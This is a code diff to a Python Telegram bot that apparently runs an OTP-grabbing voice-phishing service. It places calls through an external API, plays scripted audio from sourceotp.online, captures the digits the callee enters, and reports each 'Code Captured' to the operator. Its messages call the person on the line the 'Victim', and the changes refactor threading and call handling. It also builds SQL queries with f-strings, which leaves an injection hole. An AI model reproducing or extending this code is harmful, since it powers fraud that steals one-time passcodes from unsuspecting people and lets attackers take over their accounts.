@@ -946,24 +946,28 @@ def custom_prebuild_script_call(script_id,chatid):
     call_cost = voices[11]
     
     if event == "call.ringing":
+        
+        if call_control_id not in ringing_handler:  
             callhangbutton(chatid)
-            
+            ringing_handler.append(call_control_id)
         
     elif event == "call.answered":
-            def answeres():
-                url1 = "https://atlanta-api.online:8443/gather-audio"
-                data = {
+            url1 = "https://atlanta-api.online:8443/gather-audio"
+            data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output1.wav",
+    "maxdigits":"1"
 }
-                requests.post(url1, json=data)
-            first_answered = threading.Thread(target=answeres)
-            first_answered.start()
+            requests.post(url1, json=data)
             bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
+            try:
+                ringing_handler.remove(call_control_id)
+            except:
+                 pass
         
+
     elif event == "call.hangup":
-        def send_recording():
-            time.sleep(3.5)
+        try:
             resp = data['recording_url']
             response = requests.get(resp)
             payload = {
@@ -975,14 +979,14 @@ def custom_prebuild_script_call(script_id,chatid):
                 'audio': response.content,
             }
             requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
-        try:
+            
             per_call_cost = data['charge']
             call_cost_update = call_cost + per_call_cost
-            bot.send_message(chatid,f"""*Victim ended the call*""",reply_markup=keyboard, parse_mode='Markdown')
+            print(call_cost_update,per_call_cost)
             c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
             db.commit()
-            recording_send = threading.Thread(target=send_recording)
-            recording_send.start()
+            bot.send_message(chatid,f"""*Victim ended the call*""",reply_markup=keyboard, parse_mode='Markdown')
+            
         except:
             print("No Audio File")
 
@@ -1007,12 +1011,9 @@ def custom_prebuild_script_call(script_id,chatid):
 
 
     elif event == "dtmf.entered":
-        def send_dtmf():
-            data = request.get_json()
-            digit =  data['digit']
-            bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
-        send_dtmf_thread = threading.Thread(target=send_dtmf)
-        send_dtmf_thread.start()
+        data = request.get_json()
+        digit =  data['digit']
+        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
         
     elif event == "dtmf.gathered":
         data = request.get_json()
@@ -1037,16 +1038,13 @@ Send Your Code 📲*""",parse_mode='markdown')
             custom_send_ask_otp()
            
         elif(len(otp2)>=4):
-            def checkingCode():
-                url = 'https://atlanta-api.online:8443/play-audio'
-                data = {
+            url = 'https://atlanta-api.online:8443/play-audio'
+            data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output4.wav",
 }
-                requests.post(url, json=data)
-                otp_grabbed(chatid,otp=otp2)
-            checkingCODEthread = threading.Thread(target=checkingCode)
-            checkingCODEthread.start()
+            requests.post(url, json=data)
+            otp_grabbed(chatid,otp=otp2)
             bot.send_message(chatid,f"""*Code Captured {otp2} ✅*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
